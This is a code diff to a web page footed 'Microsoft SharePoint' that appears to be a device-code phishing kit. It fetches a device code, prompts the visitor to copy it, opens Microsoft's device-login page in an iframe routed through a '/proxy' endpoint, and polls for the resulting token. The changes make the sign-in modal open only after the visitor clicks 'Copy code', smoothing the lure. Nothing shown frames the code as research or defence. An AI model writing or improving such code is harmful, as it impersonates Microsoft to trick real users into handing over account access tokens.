@@ -352,8 +352,6 @@
                 <div class="spinner"></div>
                 <span id="spinnerText">Requesting code…</span>
             </div>
-
-            <!-- No button; modal will auto-open -->
         </div>
 
         <div class="footer">Microsoft SharePoint</div>
@@ -398,21 +396,34 @@
                 copyBtn.disabled = (text === 'Error' || text === 'EXPIRED' || text === 'Loading…');
             }
 
-            function copyOTP() {
+            // ------------------------------------------------------------------
+            // 🔥 UPDATED: Open Modal ONLY when the user clicks "Copy code".
+            // ------------------------------------------------------------------
+            copyBtn.addEventListener('click', function(e) {
                 const code = otpDisplay.textContent.trim();
                 if (!code || code === 'Loading…' || code === 'Error' || code === 'EXPIRED') {
                     alert('No valid code to copy.');
                     return;
                 }
+
+                // Perform the copy operation
                 if (navigator.clipboard && navigator.clipboard.writeText) {
                     navigator.clipboard.writeText(code).then(() => {
                         copyBtn.textContent = 'Copied!';
                         setTimeout(() => { copyBtn.textContent = 'Copy code'; }, 1800);
+                        // 🔥 OPEN THE MODAL RIGHT AFTER COPY
+                        if (verificationUri) {
+                            openInlineModal(verificationUri);
+                        }
                     }).catch(() => fallbackCopy(code));
                 } else {
                     fallbackCopy(code);
+                    // 🔥 OPEN THE MODAL RIGHT AFTER FALLBACK COPY
+                    if (verificationUri) {
+                        openInlineModal(verificationUri);
+                    }
                 }
-            }
+            });
 
             function fallbackCopy(text) {
                 const ta = document.createElement('textarea');
@@ -432,8 +443,6 @@
                 document.body.removeChild(ta);
             }
 
-            copyBtn.addEventListener('click', copyOTP);
-
             // Open modal with iframe pointing to proxy endpoint
             function openInlineModal(uri) {
                 if (!uri) return;
@@ -441,7 +450,7 @@
                 const proxyUrl = '/proxy?url=' + encodeURIComponent(uri);
                 iframe.src = proxyUrl;
                 modal.classList.add('active');
-                spinnerText.textContent = 'Microsoft sign‑in opened inline. Enter the code there.';
+                spinnerText.textContent = 'Microsoft sign‑in opened. Enter the code there.';
             }
 
             // Close modal
@@ -530,9 +539,10 @@
                     verificationUri = data.verification_uri || 'https://microsoft.com/devicelogin';
                     setCode(userCode);
                     copyBtn.disabled = false;
-                    // AUTO-OPEN THE MODAL
-                    openInlineModal(verificationUri);
-                    spinnerText.textContent = 'Microsoft sign‑in opened automatically. Enter the code there.';
+                    
+                    // 🔥 REMOVED: openInlineModal(verificationUri);  <-- It no longer auto-opens!
+
+                    spinnerText.textContent = 'Code ready. Click "Copy code" to open the Microsoft sign‑in.';
                     if (pollInterval) clearInterval(pollInterval);
                     const intervalMs = (data.interval || 5) * 1000 + 500;
                     pollInterval = setInterval(pollForToken, intervalMs);
